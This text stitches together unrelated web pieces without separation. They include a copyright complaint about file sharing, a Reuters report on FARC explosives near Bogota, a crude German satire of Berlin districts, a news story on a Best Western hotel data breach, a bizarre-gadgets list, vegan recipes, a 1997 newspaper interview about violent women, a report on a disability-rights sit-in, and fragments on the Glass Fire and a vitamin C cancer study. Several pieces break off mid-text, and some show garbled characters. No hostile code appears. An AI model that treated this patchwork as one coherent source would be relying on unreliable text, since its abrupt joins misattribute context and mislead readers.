Unfortunately , with the Internet , it is easy for people to obtain and share items that do not legally belong to them .
No matter how this is done , it is still dishonest .
This has been a very upsetting experience for me , but I hope it will at least leave my fans with a better understanding of copyright and the importance of artistic control . ”
Yet again , P2P is blamed for ‘ ruining ’ something , and this will no doubt be added to the big list of ‘ reasons filesharing should be dealt with more harshly ’ that the governments of the world get hit around the head with ( paid / lobbied / bribed ) .
BOGOTA , July 5 ( Reuters ) - Colombia found explosives set to be used in bombs across the capital in reprisal for this week 's rescue of leftist rebels ' highest - profile hostages , including Ingrid Betancourt , military officials said on Saturday .
The army seized about a tonne of explosives at a farm outside Bogota that it suspected the Revolutionary Armed Forces of Colombia , or FARC , planned to use in attacks over the next few days , said the officials , who asked not to be named .
On Wednesday , the military dealt the rebels the latest in a series of severe blows this year , duping them into handing over French - Colombian politician Betancourt , three American defense contractors and 11 Colombian soldiers and police officers .
The bloodless helicopter rescue in the jungle was hailed around the world but also raised fears that the rebels behind Latin America 's oldest insurgency could try to strike back .
This year , the FARC have managed only small - scale attacks in response to setbacks such as the deaths of three senior guerrillas .
Last month , four police officers were wounded in a suspected FARC rocket attack in Bogota less than two weeks after the announcement of the death of the group 's leader .
The military offensive of President Alvaro Uribe , a U.S. ally , has driven the rebels from urban areas and they now rarely attack the capital -- a huge contrast to a decade ago when the cocaine - financed FARC threatened to overrun the government .
This week 's rescue could have brought the four - decade - old insurgency to the brink of defeat , political and security analysts said .
It deprived the rebels of their biggest bargaining chips , likely hurt morale and exposed their fragmented organization , they said .

Fragt man die Kritiker , was sie an Berlin auszusetzen haben , kommt meistens viererlei : Hundescheiße .
Zu Laut .
Zu groß .
Zu viele Leute , die gerne hip wären , weil sie während ihrer analen Phase nur Märchenkassetten geschenkt bekommen haben .
Das ist schade , denn Berlin ist viel beschissener als allgemein angenommen .
Jeder , der den Einbürgerungstest erfolgreich besteht , weiß , dass Berlin eigentlich gar nicht existiert .
( Den „ Wenn eine Stadt Bielefeld ist , dann ja wohl Berlin . “ hab ich mir gerade noch verkniffen . )
Berlin ist eine Ansammlung von Dörfern , die über 3.000 Einwohner nicht hinausgekommen sind und sich , weil sie zufällig nah beieinander liegen , ein gemeinsames Schienennetz aufgebaut haben .
Allerdings ist die Verwaltung des Schienennetzes föderalistisch organisiert .
Das hat Auswirkungen auf die Funktionalität , und keine positiven .
Ähnlich kundenfreundlich wie die BVG ist vielleicht noch der Kommunismus gewesen , Einstellungsvoraussetzung beim Servicecenter ist es , die letzten drei Jahre keinen Spaß gehabt zu haben .
Wer Antidepressiva nimmt , dem darf gekündigt werden .
Und es ist natürlich nett von der BVG , soziale Verantwortung zu übernehmen : aber war es wirklich nötig , die Planungen der Anschlusszüge und des Schienenersatzverkehrs der Demenzgruppe Niederlausitz zu übertragen ?
Das beste an Berlin ist : es gibt hier kein Wetter .
Entweder es ist warm und diesig oder kalt und nebelig , der Rest wurde weggespart , wegen Schulden .
Berlin ist ja großmütig und hat einem Haufen Millionäre die Rente gesichert , dafür spart man jetzt an den Kindern und Sozialprojekten , das ist sinnvoll : denn Kindern und Sozialprojektleitern begegnet man nicht auf Sektempfängen .
Friedrichshain
Friedrichshainer beschimpft man am besten , in dem man den Leuten aus dem Südkiez erzählt , wie toll der Nordkiez wäre , und andersrum .
Hier wohnen Menschen , die sich allmorgendlich den Kopf mit Lebertran waschen und es hip finden , wenn eine Bedienung schlecht gelaunt ist und ungewaschen .
Überhaupt ist im Friedrichshain alles hip , die stinkenden Keller , die hier „ Clubs “ heißen : sehr hip .
Der Flohmarkt , auf dem man Möbel und Platten kaufen kann , die auf Ebay die Hälfte kosten : ausgesprochen hip .
Bars , in denen die Ärzte laufen und die Bedienung den Unterschied zwischen Weizen und Pils nicht kennt : ungeheur hip .
Man kommt sich vor wie in einem Babybrei .
So ungefähr fühlt man sich abends auch , in den Kneipen dieses Dorfes , die deswegen mit lauter Sofas und Kanapees ausgestattet sind , weil seine Bewohner sich zu Verabredungen zwar keine Blumen mitbringen , dafür sehr schicke Neurosen .
Die dann bei Gin Tonic und der aus Abwasseraufbereitungsanlagen destilierten Plörre , die hier als Bier durchgeht , besprochen werden müssen lang und breit .
Wer Desperate Housewives für übertrieben hält , soll sich mal im Habermeier oder sonstwo am Boxenhagener Platz die Hartz4 - Version anhören .
Neukölln
Neukölln ist megain gerade , weil , um die Ecke haben drei Bars aufgemacht , die keine Tapete an den Wänden haben .
Das ist hochrevolutionär , dazu tönt Coldplay aus den Boxen .
Galerien hat es auch , die sehen aus wie Bars , nur ohne Musik , ohne Bier und ohne Gäste .
Außerdem sieht man hier hübsch viele Originale , das heißt : an den Arcaden herumstehende Alkoholiker , die sich über ihre Methadon - Therapie austauschen .
Auf den Straßen wird viel gerotzt , und in den meisten Cafés sitzen weder Frauen noch Hunde , beiden ist der Zutritt verboten .
In der Hasenheide wird man inzwischen übrigens nicht nur angeradebrecht , ob man Gras haben will , sondern sogar angerappt : da bekommt der Terminus „ gebrochenes Deutsch “ eine ganz neue Bedeutung .
Wilmersdorf
Sie haben eine Oma abzugeben ?
In Wilmersdorf ist bestimmt noch eine Wohnung frei irgendwo .
Da stirbt ja ständig wer , beispielsweise aus Langeweile .
Prenzlauer Berg
Ahhhh , der Prenzlberg , die Vereinigten Staaten im 19 .
Jahrhundert :
Wer hier einen Einheimischen findet , darf ihn erschiessen und statt seiner in die Wohnung einziehen .
Im letzten Jahrhundert sollen noch vier Exemplare von Alteinsässigen gesichtet worden sein , inzwischen sind die Straßen bevölkert von Spaniern , Italienern , Briten , Amerikanern , Franzosen , Schwaben und Medienfuzzis .
Wenn Neukölln die Müllkippe der Globalisierung ist , ist der Prenzlberg der Wellness - Bereich .
Hier kann man sich alles leisten , Kirschbaumschränke , leinengebundene Goethe - Gesamtausgaben , Latte Machiato - Maschinen , Kinder , in genau der Reihenfolge .
Hat man das alles , trinkt man Bio - Weißwein auf Bio-Balkonen , aber nicht allzuviel , weil man nicht mehr allzulange still sitzen kann , seit man sich beim Bio - Yoga den rechten Bio-Arschmuskel gezerrt hat .
In einem Satz : es geht zu wie in einem von Warhol reproduzierten Spitzweg - Gemälde , bloß die Ironie ist verzogen .
Inzwischen ist die einzige sich nicht langweilende Subkultur die im Bio-Joghurt .
Mitte
In Mitte gibt es Galerien , deswegen simulieren Aktionskünstler so etwas wie ein Nachtleben .
In den Clubs ( in Berlin sagt man Clubs ) amüsieren sich amerikanische Backpacker und heiratswillige Mitdreißigerinnen mit [ Selbstwahrnehmung on ] aufstrebenden , talentierten , gutaussehenden , witzigen , einfallsreichen , lockeren , fein gekleideten , eloquenten , hatten wir talentierten schon ?
[ Selbstwahrnehmung off ] koksenden Jungkünstlern , die danach brav zurück in den Wedding zurückfahren oder in irgendeinem fremden Bett landen , wo sie auf Grund der Drogen keinen mehr hochkriegen .
Was in den Clubs ( in Mitte sagt man sogar zu Eckkneipen Clubs ) immer gut funktioniert :
Ist man pleite , immer den Besoffensten des ganzen Ladens ansprechen , ob er noch einen ausgeben will .
Das ist nämlich in der Regel der Chef .
Wedding
Der Wedding kommt .
Seit ungefähr sechzig Jahren .
Bloß : nirgendwo an .
Kreuzberg
Die Kreuzberger Nächte , jaja .
Kreuzberger Nächte sehen so aus : Man sitzt auf seinem Stuhl , trinkt Schnaps um Schnaps und wird irgendwann vom Wirt in ein Taxi gefallen , das einen erst nach Weissensee rausfährt , dort eine Runde reihern lässt , und dann zurück nach Hause ( Neukölln ) .
Die Bewohner Kreuzbergs zeichnen sich dergestalt aus , dass die Alten gerne die Junggebliebenen mimen ( was ihnen gelingt , sofern sie ihre schadhaften Zahnreihen verstecken ) , und die Jungen gerne abgeklärt tun .
Außerdem sind alle voll Multikulti , kennen aber außer dem Gemüsemann ums Eck und der hauseigenen Putzfrau keine ausländischen Mitbürger .
Schöneberg
Verfügt über dreieinhalb Straßenzüge , die gesetzter sind als Sankt Georg , aber wilder als der Eppendorfer Baum .
Schönes Viertel für Bürgerliche , die gerne keine wären , und Bäume .
Irgendwo da solls fast so gute Pizza wie in Lübeck geben .
Spandau
Im Mittelalter war es üblich , Lepröse und Pestkranke vor den Toren der Stadt zwischenzulagern , bis sie der Tod ereilt .
Wer in Berlin Leute mit Rasseln durch die Gegend eiern sieht : das sind keine Stadtmusikanten .
Das sind Spandauer , die einmal im Leben den Fernsehturm sehen wollen .
( Früher fanden einmal im Jahr WG - interne Ausflüge nach Spandau statt , weil da damals der Ikea stand .
Der Ikea steht da immer noch , aber seit die Filiale am Südkreuz aufgemacht hat , ist der Umsatz um 95 % gesunken und die Spandauer Touristeninformationsempfangsdame , die bisher die Leute vom Busbahnhof zu Ikea lotste , wurde kürzlich entlassen . )
Pankow
Schließen Sie die Augen und stellen sich Karlsruhe vor , bloß ohne Studenten .
Ja ? Gut .
So ungefähr .
Eight million people at risk of ID fraud after credit card details are stolen by hotel chain hackers
Security breach : A Best Western Hotel in Amsterdam
Up to eight million people are at risk of ID fraud after a hacker breached the security system of the world 's largest hotel chain .
An Indian hacker broke into the IT system of Best Western Hotel Group and stole personal details of everyone who has stayed there in the past 12 months .
The details , which included home addresses , phone numbers , place of employment and credit card details , were sold on through an underground network controlled by the Russian Mafia .
The information is thought to be worth up to £ 2.8 billion .
Experts say that if it falls into the wrong hands it could spark a ' major crimewave ' .
' They 've pulled off a masterstroke here , ' said security expert Jacques Erasmus , an ex-hacker who now works for the computer security firm Prevx .
He added : ' There are plenty of hacked company databases for sale online but the sheer volume and quality of the information that 's been stolen in the Best Western raid makes this particularly rare .
' The Russian gangs who specialise in this will have been exploiting the information from the moment it became available .
In the wrong hands , there 's enough data there to spark a major European crimewave . '
Best Western became aware of the theft on Thursday night .
It instantly disabled the log - in account from which the information was stolen , but not before the details of millions of people had been removed .
Tim Wade , head of marketing for Best Western in Britain , said it was ' unlikely ' the thieves got details of every booking in Europe because of the way their system worked .
He added : ' We are investigating further and working with our credit card partners to ensure the interests of our guests are protected . '
Last night a statement on the Best Western website said it did not believe British customers had been affected .
In todayâ€™s world new gadgets are released on a daily basis .
There are so many gadgets out there and for some of us , many become a big part of our lives .
In order to increase our daily utility and have more fun , we constantly seek new gadgets that would fit that need .
This means that many of us continually hunt for the next weird gadget , productive tech product , or even something just to bring a shock value .
Regular USB gadgets , cool watches , and funny gizmos sometimes just donâ€™t cut it and there are some weird gadgets out there that would raise more than a few eyebrows .
Literally , gadgets that you would not want to bring home and show your mom .
This is a cool list of 11 bizarre gadgets which some family members just wouldnâ€™t understand , so why try ?
1. ‘ Lethal Weapon ’ Espresso Machine
I have always been freaked out by the prices of todayâ€™s coffee , but this espresso maker just looks scary by itself .
The Saeco Etienne Louis espresso coffee machine looks like something from a B - Side Science Fiction movie , and you know whatâ€ ¦I love it .
What can be cooler than something that will make your coffee and also be a lethal weapon for protection .
Designed by Carlo Borer , the sphere is steel made , and both its spikes and legs are made of polished aluminum .
Probably the price will scare the heck out of us as well .
2. Guy Fawkes Facial Toner Mask
The Guy Fawkes mask similarity is apparent , including the Man in the Iron Mask , or even the Phantom of the Opera musical , but this mask is actually to tone your face .
I am not sure if the light pulsation from the 9 Volt battery or the 26 gold plated contact points actually do the job of reducing wrinkles , but I would scare myself if I looked in the mirror while wearing one .
Yes , with the adjustable headband , it is for both men and women .
15 minute daily treatments are supposed to clear your face of aging , but do we really want to hide behind a scary mask to do that ?
If you are still interested or want to read more information about this crazy product , you can get more details or purchase here .
3 . The USB Hub Monster
This freaky looking USB mutant is enough to either be a productive USB hub or keep your children away from all your different gadgets .
A multi-legged creature from Instructables could actually be a black sheep within your family but provide some great effective and artistic accessory for your home or office .
You can make your own using just a 7 port USB hub , short USB extension cables , armature wire and some black fabric to give the monster some clothing .
I would love to see my mother ’s face if she walked into my room and saw this USB monster staring right back at her .
4. The Scary Interactive Mirror
Remember the room of mirrors in some amusement parks ?
I loved getting in front of them and getting the freaky looks staring right back at me .
This mirror though , designed by William Gurley actually gives you some personal interactivity .
The magic wand will let you become Harry Potter and distort your own image as you move it around the mirror .
5. Brief Safe – Protection Against Thieves
Although these briefs are not too attractive , the brief safe could deter thieves .
They are actually a great solution for travelers that may leave some money back at the hotel .
Just imagine a thief going through your belongings and seeing this pair of underwear laying around .
I am fairly certain they would think twice before checking this pair of underwear for some valuables .
I know I would n’t touch these , would you ?
6. The Swiss Army Sunglasses Gadget
Whether it is the summer or not , sunglasses are a daily used item that can also protect our eyes .
But it would be great if they pack a not so little surprise – just in case you need some extra tools with you .
Rodd Miller designed these Future Sunglasses which may be liked by your mother to begin with , but if all the tools spring up from it , you can probably scare her away .
As great as Swiss Army Knives are , some of us donâ€™t want to carry an additional gadget with us .
These sunglasses combine the additional productivity ( in case ) but within a product we already use often .
It is fairly customizable , where you may select from over 240 different tools that you would like inside , such as : paintbrushes , knives , back scratcher , corkscrew , comb , and much more .
7 . The End of the World USB Hub
It may seem like a harmless replica of a villainous device on the surface , but your parents may think otherwise , and airports may not look kindly if you try to bring it with you .
The Doomsday device has not one , or two but three safety switches before you can press the â€œend of the worldâ€ button .
The great thing is that while you are planning your scheme in your room or corporate tower , it is actually a great 4 port USB hub to connect your evil gadgets to .
We have never actually pressed the button , because you know it is clearly a “ do n’t press the red button ” scenario .
8. Sonic Grenade
There are a lot of ways to prank your friends or coworkers , one way can be a loud wake up alarm using the Sonic Grenade .
As the innocent victim sleeps , you creep up like a commando in the room .
You pull the trigger on this sonic grenade , throw it in bed with your friend , and take cover out of earshot .
The loud , piercing alarm will wake them up faster than any stereo , drums , or a parent could .
The catch â€ “ there is only one way to stop the madness : replace the pin in the grenade .
So please make sure you do not misplace .
Just like The End of The World USB Hub , you do not want to be caught with this gadget at the airport or even worse – a bank .
You can purchase your own here .
9. Egg Separator
This gadget may actually be the one that could keep your mom off of your case .
Keep it in the kitchen for her , granting her an easy way to separate eggs .
Utility - wise , this could be a very practical gadget for your mom , but its look may cause her some nausea .
While she is baking some cakes and cookies for her wonderful and loving family , you could be in your room devising some additional plots to take over the world .
10 . Mechanical Cat Paws
This one is just plain weird : a mechanical operated cat paw .
What is it used for ?
Have a personal back scratcher , tap a co worker on the shoulder , or simply tell yourself it is a good luck charm .
Use with caution if you are allergic to cats .
11 . Chair USB Powered Ass Cooler
It is hot in the office and sometimes our work room is scorching just as well .
If you just canâ€™t find the time to step away from your desk , and instead of warming your seat , you feel it is heating you upâ€ ¦then this USB Ass Cooler is for you .
USB connected , it brings you a fan from the bottom up .
A fan is installed in your actual chair , so you can have a personal air condition that is just in your space .
This may make you the envy of the office , and many may flock to be around your cool aura .
If you wish , you can check out the manufacturer ’s site here ( foreign language ) .
This is the end of our 11 Bizarre Gadgets , but I am certain there are many more out there .
If you ran across some other weird gadgets that should have been included , please let us know about them in the comments .
It ’s amazing how many people nowadays have bizarre and unusual names .
Most changed their names via deed poll , but a few were born with that given name , and very few have gone on to live successful lives regardless of their name .
The following people have fantastic or apt names , all are their original birth names , and all have achieved some sort of fame outside of their name .
1 Fantastic Names 1 – 5
1. Canaan Banana

Eating lower on the food chain is a great way to minimize your personal environmental impact .
Fortunately , incorporating more earth - friendly fare into your menu does not require slimy tofu or weird vegetables .
Long gone are the days of rice cakes and baby carrots .
Eating a vegan meal now and then is a great way to live a little greener , even if you can't quite commit to a meat - free lifestyle .
Is your girlfriend a vegetarian and you find yourself sneaking off to scarf a beef burrito ?
This post is for you .
Here are 20 vegan meals that do n't suck – even if you 're an omnivore .
1. Sloppy Janes
Even Adam Sandler would like this one .
The great thing about this recipe is that it 's really easy to make .
Actually there are two great things : it uses tempeh , which is an extra - chewy type of tofu that is perfect if you 're a meat eater .
Tempeh holds sauces really well – in fact it 's similar to chicken nuggets in terms of consistency .
If you are new to tempeh , you 'll find that the taste is really nutty and satisfying .
One thing that a lot of vegan meals miss is that all - important rich mouthfeel – the Japanese call this fatty , meaty taste umami , or the fifth taste .
For an equally drool - worthy Sloppy Jane made out of texturized vegetable protein ( TVP ) , visit hellyeahitsvegan ( pictured ) .
2. " Chicken " and Sundried Tomato Sandwiches with Fresh Pesto Basil
This sandwich just kicks ass .
Choose the fajita strip style prepared " chicken " by Yves in the vegetarian case at the supermarket .
It 's nicely flavorful and succulent and does n't have that mock meat consistency you often get with things like tofurkey slices .
If you do n't say anything , your carnivore friends may not even notice .
3. Tofu Scramble
I was skeptical the first time my vegan roommate made a tofu scramble for breakfast .
Honestly it tastes nothing like eggs , but that is n't a bad thing .
It 's good and very easy to whip up in just a few minutes .
This is great for those times when you 're all out of eggs .
All you need are some basic spices and a handful of frozen veggies .
This particular recipe calls for turmeric to give a little curry flair , but try chipotle and jalapenos for a great Latin twist .
You can pretty much put anything in this and it will taste great .
Good hangover dish .
4. Guac and salsa
Who does n't like guacamole and chips and salsa ?
Add in some healthy blue corn chips ( organic ) and you 're set .
Avocados , the main ingredient in guacamole , are really good for your heart and skin and salsa contains antioxidants and vitamins .
See , all these Super Bowl Sundays , you 've been eating vegan and did n't know it !
Bonus on this recipe : if you 're really lazy you can just buy both at the market .
Select organic if it is available .
5. Vegetarian Chili
Everybody likes chili .
It 's easy to make , it 's ridiculously cheap ( beans and tomatoes ) , and it 's so hearty no one will even miss it without the ground beef , though you can add seitan for texture .
Wash it down with a cold beer .
This recipe includes red quinoa for extra protein that will keep you full .
6. Grilled Salad
The first time I had grilled romaine salad was at Restaurant 301 in Eureka , CA .
Because they flame - broiled the lettuce spears for just a moment , the salad was mysteriously smoky and meaty .
Yet vegan .
This version is delicious – you 'll actually want to lick the plate .
7. Chocolate Covered Strawberries
That 's right – one of the best aphrodisiacs around ( not to mention tastiest desserts ) is vegan .
All you 'll need is strawberries and chocolate .
That 's it .
Delicious .
To make : simply wash fresh strawberries , pat dry and dip in to chocolate ( vegan ! ) melted over a double boiler .
Let dry on wax paper and serve within 24 hours .
8. Chana Masala
An Indian staple dish , chickpea curry is substantial , nicely textured ( all those garbanzo beans to bite into ) , and rich in flavor .
It 's fairly simple to make , too .
No clay oven or pressure cooker necessary .
Serve with hot naan or brown rice .
Everyone loves this dish .
9. Soba Noodles with Peanut Sauce
If your dinner pal is OK with vegetables , add some fresh broccoli florets to this to make the peanut sauce sing .
Soba noodles are incredibly nutty , dense and filling , so even carnivores will love this meal .
Soba noodles are really versatile , so you can cook them in a rich broth , use them like you would pasta , or top them with all kinds of veggies .
10 . Fettuccine Alfredo
This one is a bit riskier because it involves numerous faux dairy ingredients .
But it 's worth inclusion , because if done right the result is rich , creamy , and decadent fettuccine alfredo .
First , dress this recipe up : add a tiny bit of either white wine or vodka to make the sauce extra-savory .
Next , up the " cheese " and leave out the soy milk altogether so you 're guaranteed a really thick sauce .
What ruins this dish and makes it obviously vegan is the watery factor .
Skip the soy milk to avoid this issue .
And , as shown , you can use any pasta shape that you like .
Curly and shell shapes will hold extra sauce .
11 . Amazing Pancakes
The. best . pancakes .
ever .
They 're fluffy , moist , sweet , and a touch salty .
Pancakes are vegan – but who cares , they 're that good .
Whip these cakes up anytime , even for dinner or a late - night post - drinking snack with your friends .
To make them even more delicious , add blueberries or ( recommended ) dark chocolate chips to the batter .
12 . Seitan Fajitas
Seitan is a realistically - textured " wheat meat " that most closely resembles leftover ( read : a bit dried - out ) roast beef .
Seitan was originally developed by a Japanese macrobiotic teacher in 1962 , and is made by " washing " wheat flour dough until the starch is completely removed .
Not only is Seitan Vegan - friendly , its surprisingly high in protein , too .
These seitan fajitas are spicy , easy to shred for pulled - not - pork tacos the next day , and fast to prepare .
13 . Vegetable Paella
While traditional paellas famously include fresh seafood and shellfish , this is a pretty amazing vegan version .
The secret weapon to " meat it up " : drizzle in a generous amount of truffle oil .
14 . Fried Tofu
Warning : it 's not as easy as slathering yourself a PB&J and it's not healthy , either .
But what 's life without a little fried goodness from time to time ?
Forget the fish and chips next time you 're in the mood for breaded trans fat , and go for salty , hot , crunchy fried tofu instead .
The extreme heat of the oil keeps the tofu moist but magically firm .
It 's like a chicken nugget , only good for the planet .
Just not for you .
Roll it around in some really coarse sea salt and dip in something tasty like sweet 'n sour or soy sauce .
15 . Nut Loaf
Oh , the nut loaf .
Though nut loaf is not exactly a gourmet delight , neither is meat loaf .
If you 're willing to eat a loaf of anything , it may as well be nuts .
This is incredibly rich and filling , so eat slowly or you wo n't want to eat for days .

16 . BBQ Tempeh
It 's BBQ , but vegan .
And it actually holds up well .
Because it 's baked , the texture is substantial and satisfying .
If you like chicken satay you will enjoy this vegan dish .
Serve with huge , icy , salt - on - the - rim margaritas .
17 . Mushroom , Pea , and Asparagus Risotto
Risotto is a great trick to have up your vegan sleeve .
Its consistency is naturally extra-creamy , unlike most rice .
If you 've never had risotto you 're in for a delicious , creamy treat .
Risotto takes a while but is very simple to make .
This one has lemon zest and wine , which gives it a great layer of fresh flavor .
The mushrooms and peas add a little meatiness , too .
18 . Spring Rolls
Fresh spring rolls are a staple in traditional Vietnamese and Thai cuisine - but often they feature shrimp , pork and other meat products .
These Thai - style spring rolls are accompanied by traditional flavors of lime , mint , the basil and the peanuts .
Dip in the accompanied spicy
Thai peanut sauce for a refreshing summer meal .
You can't go wrong with these phenomenal vegan spring rolls .
It 's just one more vegan meal that does n't suck .
19 . Vegan Honey - Soy Glazed Stirfry with Brown Rice
Honey Soy Glazed Tofu with Brown Rice - Not only is this stirfry recipe vegan - friendly , it 's also gluten - free if you use wheat - less soy sauce .
Firm tofu is a tasty alternative to meat , and it 's coated in a sweet homemade honey teriyaki glaze .
Fresh broccoli gives the dish brightness and a fun pop of color .
Serve on brown rice for a well - rounded meatless meal .
20 . Leek and Corn Stuffed Peppers
We are including this recipe because it's healthy , really easy and simple to make , and bursting with great flavors .
It 's also a little bit more fancy , so it makes a good dinner for guests or a first date .
Leeks add mellow bite , the corn is sweet and has great texture , and the pepper is substantial and a tiny bit smoky .
Cornbread on the side would be dynamite .
There you have it – not just vegetarian , but vegan meals .
Try one or try them all and come back soon for more .

National - Ottawa Citizen Online Sunday 26 October 1997
Getting away with murder Ian McLeod A Toronto author says women get off the hook for violent crimes because society wo n't admit they can be predators .
Ian McLeod reports .
Some women are getting away with murder simply because they 're women , says the author of an explosive new book on female violence .
In her 243 - page volume When She Was Bad : Violent Women and the Myth of Innocence , Toronto writer Patricia Pearson argues legal defences , such as battered - women 's syndrome , and misogynistic attitudes are giving some women social permission to kill and be violent because society finds it too threatening to admit women are capable of being ruthless , raging predators , just like men .
We would rather think of violent women as hopeless and frail or child - like creatures of abuse or just plain crazy , she says .
But that sort of thinking , she warns , breeds self - justifying women like the villainous Karla Homolka , who sat in her prison cell reading the books Battered Women and Perfect Victim after winning her plea - bargained 12 - year sentence for helping kidnap , sexually torture and kill three teenage girls , including her own sister .
" It worries me when people begin to feel entitled to use violence because they 've bought so deeply into the idea of their own victimization , " Ms. Pearson said during an interview .
" The whole idea of learned helplessness is , you 're so helpless you can't walk out the door and therefore , somehow , you 're able to discover the strength to shoot the guy in the head .
I think a larger number of women than we realize get away with murder for a whole number of different reasons .
" We do n't want to take female violence seriously because I think we have our hands full with male violence and I think that we have an idea of women as being the people that you go to for your shelter .
" Out there in the mad and dangerous world at least you can go home at night to a sweet and comforting hearth .
We can't accept the fact that we can't go home to a safe house . "
But Ms. Pearson does n't stop there .
Some feminists , she says , have joined in an unholy alliance with misogynists to keep the issue of female violence hidden .
That allows misogynists to avoid admitting women are as complex as men and that they commit violence for an intricate variety of reasons , rather than simply madness , battering and self - defence .
It also allows some feminists to continue portraying women as victims rather than predators and to cast out criminal women as isolated sexual deviants , dykes and witches .
The silence on the issue , she says , is making sacrificial lambs out of men who are victimized by violent spouses , mothers and other women .
" These guys are pariahs because we 're so preoccupied with our fear of what other men are going to do with female aggression statistics .
" The male victims of spousal assault are sort of the sacrificial lambs to our political concern with violence against women . "
Paradoxically , one reason she wrote the book was to advance the feminist cause of equality .
" We have to get a grip on the capacity for women to be injurious , on women 's terms .
We have to stop just reacting against how men define us by saying , ' No , we 're not that way , we 're good , we 're this , we 're that ' and say , ' Well , you know , yes we are complex and we do do things that are n't necessarily , what is that term , sugar and spice ?
But we 're responsible for them ( violent actions ) and we want to examine them on our terms and sort them out , develop our own sort of sense of moral accountability and have a better understanding of our own power . '
" I think it 's terribly justified for women to kill men when they 're situationally trapped , " she says .
" I think they should just be able to do it rationally , just say , ' What would you have done in my shoes ?
It was rational self - defence . ' "
The book 's one obvious flaw , for Canadians at least , is its heavy reliance on American case studies and U.S. research statistics .
Ms. Pearson admits the U.S. culture of violence is far more pronounced , but " my American publisher paid me the most money , so I had to do mostly American research , so I tended not to focus very much on the Canadian stuff . "
Despite the huge statistical differences in the levels of violence in the two countries , many of the underlying issues are the same , says Ms. Pearson , who specializes in writing on crime issues .
In fact , she got the idea for the book while covering the 1995 Paul Bernardo murder trial and watching the all - Canadian Ms. Homolka testify .
She later won a prestigious national magazine award for her article " Behind Every Successful Psychopath " published in Saturday Night magazine , where she 's a contributing editor .
" I could n't believe that there was n't any other explanation for her but that she was battered .
I just thought that was nuts .
I started to look into it and I realized that there was very little research on female aggression and that there had to be alternative explanations that presumed that women were complex and that they were powerful and ambitious and they were capable of being rageful and wrathful and so on . "
What she found , she writes in the book , is that " although self - justification ( for a violent act ) is universally human , the vocabulary of motive is different for male and female offenders .
Because we wo n't concede aggression and anger in women , the language we use to describe what they do is much more limited , and much more exonerative .
" There exists perhaps three or four rationales for the whole , extraordinary diversity of violent acts women commit , and they all play into pre-existing prejudices about female nature .
" The operative assumption is that the violent woman could n't have wanted , deliberately , to cause harm .
Therefore , if she says she was abused / coerced / insane , she probably was . "
During this week 's interview with the Citizen , Ms. Pearson took specific aim at Ontario Judge Lynn Ratushny , who recently completed a two - year review of 98 cases of women convicted of murder and manslaughter .
The women had claimed they killed abusive men in self - defence , but that was before a 1990 Supreme Court of Canada ruling allowing the battered - women 's syndrome defence .
As a result of Judge Ratushny 's review , the federal government in September announced it is pardoning two women and erasing the remainder of [ some 30 or 40 women 's murder sentences , as far as I can recall — F4L ] says Ms. Pearson .
" My argument to that would be , that everybody who commits a violent crime perceives themselves as threatened , and that includes serial killers . "
In the book , she writes : " By the time Homolka took the stand in 1995 , the standard of what degree of brutality a woman must sustain before she succumbs to this ' syndrome ' had eroded to the point of insulting plausibility . "
Although the book has only been out for a week , Ms. Pearson is already being targeted by some women for what they consider a blasphemous piece of work .
" My publisher got a letter from a battered woman 's activist , who had n't read the book , demanding to know why they 'd published me .
' I suppose , ' she wrote , ' that you would also deny that children are starving in Africa . '
" Well , how do you respond to that ? "
She also recognizes there 's a danger some anti-feminists may latch on to her book to promote their views .
" For far too long we 've been afraid that men are going to define our positions for us .
We have to get past that and say ' Well fine , a couple of neo - conservative lunatics are going to say , ' See women do it too , ha , ha , ha , ' but the vast majority of people are maybe actually going to gain a much greater understanding of a very complex subject and that 's , to me , worth the risk .
" I think it 's really important that we understand that if we 're going to look at causes of violence , we stop looking at it in gender terms , because you can't understand a man who beats his wife if you do n't understand that he may have been beaten by his mother and may have become a misogynist .
Not that it 's always that simple , but it 's not useful to look at it purely in gender terms .
There are contributions going back and forth between females and males in cycles of aggression . "

Disability advocates stage sit-in at Barney Frank 's office Nick Cargo
Published : Wednesday September 17 , 2008
Print This Email This
This week , dozens have been arrested in Washington after confronting one congressman and two senators , The Hill reported .
Fifteen members of ADAPT , an advocacy organization for people with disabilities , staged a sit-in at the office of Congressman Barney Frank ( D - MA ) , chairman of the House Financial Services Committee , on Wednesday .
They sought to discuss their continued efforts to secure an allocation of Section 8 housing vouchers , yet to be funded by this Congress .
" Last year Rep. Barney Frank told us that he could get 500 housing
vouchers from HUD that would be targeted to free people with disabilities
who live in nursing homes and other institutions , " said ADAPT 's Diane Coleman .
" He repeated that promise for months , and then one day he suddenly says he can't help us . "
" Frank arranged a hearing on this funding , and not only did he not invite any people with disabilities to testify , he did n't even notify us about the hearing , " Coleman added .
" So , today , we decided to confront him on his broken promises and bad faith . "
" Congress just bailed out the middle class , " said ADAPT organizer Randy Alexander .
" It 's time that lower - income families and individuals get some assistance . "
Legislation including the vouchers has passed the House , Frank said , adding that there was nothing more he could do ; the House Appropriations Committee has n't approved funding for them , and probably wo n't until after President Bush leaves office .
" When I heard that they had stormed into the office and occupied it , " Frank said , " I went in and told them that was not an acceptable way of doing business and I told them to leave and if they didnt leave , I would have the police remove them . "
" I think that its undemocratic , these kind of tactics , " he added , " and I wont be influenced by them . "
" The TV is full of news about the bank crisis , and the mortgage crisis ,
and the need for candidates to appeal to middle income people , " said ADAPT organizer Cassie James .
" Meanwhile , people who live
on disability benefits , and people who are trapped in nursing homes
because of no housing are being held hostage while the government bails
everyone else out .
Rent has gone up so much , it 's higher than many monthly
disability benefits .
Not only do us younger people with disabilities need
affordable , accessible housing , older people need it , too .
This is a
crisis , and we need help to solve it . "
" I very much agree with them and I have in fact been working for it , " Frank added .
" Frankly , their problem is not with me , its with the appropriations process and the budget .
They re very frustrated , so they came , and I dont know why they thought doing this in my office was going to help them .
" Some of the leaders may have thought that I could get [ House Appropriations Committee chairman ]
Obey ( D - WI ) to do something .
But Obey can't make money that is n't there .

California 's Glass Fire impacts iconic wineries
The Glass Fire has damaged an untold number of Napa Valley , California , wineries and resort properties that draw tourists from around the world .
High - dose injections of vitamin C , also known as ascorbate or ascorbic acid , reduced tumor weight and growth rate by about 50 percent in mouse models of brain , ovarian , and pancreatic cancers , researchers from the National Institutes of Health ( NIH ) report in the August 5 , 2008 , issue of the Proceedings of the National Academy of Sciences .
The researchers traced ascorbate 's anti-cancer effect to the formation of hydrogen peroxide in the extracellular fluid surrounding the tumors .
Normal cells were unaffected .
Natural physiologic controls precisely regulate the amount of ascorbate absorbed by the body when it is taken orally .
